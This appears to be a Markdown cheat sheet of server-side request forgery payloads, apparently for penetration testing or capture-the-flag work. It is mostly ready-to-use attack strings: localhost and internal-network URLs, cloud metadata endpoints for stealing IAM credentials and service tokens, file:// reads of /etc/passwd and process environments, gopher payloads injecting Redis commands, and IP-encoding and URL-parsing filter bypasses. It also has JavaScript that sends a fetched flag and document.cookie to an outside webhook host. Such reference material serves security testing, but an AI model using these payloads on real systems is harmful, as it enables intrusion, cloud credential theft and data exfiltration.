# Server-Side Request Forgery (SSRF)

## Quick wins
- Test for URL parameter manipulation first
- Try internal IPs: 127.0.0.1, localhost, 0.0.0.0
- Check cloud metadata endpoints immediately
- Look for URL schemes: file://, gopher://, dict://

## Basic Payloads

### Localhost variants
```
http://127.0.0.1/admin
http://localhost/admin
http://0.0.0.0/admin
http://[::1]/admin
http://127.1/admin
http://127.0.1/admin
```

### Internal networks
```
http://192.168.0.1/
http://10.0.0.1/
http://172.16.0.1/
```

## Cloud Metadata Endpoints

### AWS
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance
```

### GCP
```
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Requires header: Metadata-Flavor: Google
```

### Azure
```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01

# Requires header: Metadata: true
```

### DigitalOcean
```
http://169.254.169.254/metadata/v1/
```

## Protocol Smuggling

### File protocol
```
file:///etc/passwd
file:///c:/windows/win.ini
file:///proc/self/environ
```

### Gopher protocol
```
# Redis command injection
gopher://127.0.0.1:6379/_INFO
gopher://127.0.0.1:6379/_SET%20key%20value

# HTTP request via gopher
gopher://127.0.0.1:80/_GET%20/%20HTTP/1.0%0d%0a%0d%0a
```

### Dict protocol
```
dict://127.0.0.1:11211/stats
```

## Bypass Techniques

### IP encoding
```
# Decimal
http://2130706433/  # = 127.0.0.1

# Hex
http://0x7f000001/  # = 127.0.0.1

# Octal
http://0177.0.0.1/

# Mixed
http://127.0.1/
http://0x7f.0.0.1/
```

### DNS rebinding
```
# Use a domain that resolves to internal IP
http://spoofed.burpcollaborator.net/
http://localtest.me/  # Resolves to 127.0.0.1
http://127.0.0.1.nip.io/
```

### URL parsing
```
# @ bypass
http://evil.com@127.0.0.1/

# Fragment bypass
http://127.0.0.1#@evil.com/

# URL encoding
http://127.0.0.1%00.evil.com/
http://127.0.0.1%2523@evil.com/
```

### Redirect bypass
```
# Use open redirect to reach internal
http://allowed.com/redirect?url=http://127.0.0.1/
```

## XSS + SSRF Combo

```javascript
// Fetch internal resource and exfiltrate
fetch('/flag').then((r)=>r.text()).then((t)=>fetch(`https://webhook.com?c=${encodeURIComponent(t)}`));

// Alternative with Image
new Image().src='https://webhook.com?c='+document.cookie;
```

## Common Ports to Try

```
21    FTP
22    SSH
25    SMTP
80    HTTP
443   HTTPS
3306  MySQL
5432  PostgreSQL
6379  Redis
11211 Memcached
27017 MongoDB
```

## Detection Tips

- Look for URL parameters: `url=`, `path=`, `src=`, `redirect=`, `uri=`
- Check for image/file fetch functionality
- PDF generators, HTML to PDF converters
- Webhook functionality
- Import from URL features

## Tools

- [SSRFmap](https://github.com/swisskyrepo/SSRFmap)
- [Gopherus](https://github.com/tarunkant/Gopherus): Generate gopher payloads
- [Burp Collaborator](https://portswigger.net/burp/documentation/collaborator)
